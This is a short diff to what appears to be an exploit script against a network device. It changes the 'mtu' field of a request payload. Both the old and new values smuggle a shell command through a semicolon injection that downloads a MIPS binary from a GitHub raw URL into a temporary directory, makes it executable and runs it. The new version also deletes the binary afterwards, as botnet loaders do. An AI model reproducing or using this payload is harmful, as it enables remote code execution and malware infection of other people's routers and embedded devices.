@@ -25,7 +25,7 @@ data = {
     "port": "4",
     "vlan_tagged": "1",
     "vlanid": "5",
-    "mtu": '; bash -c "cd /tmp;wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips;chmod 777 mips;./mips;"',
+    "mtu": '; bash -c "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/mips; chmod +x mips; ./mips; rm -rf mips"',
     "data": "hi",
 }
 
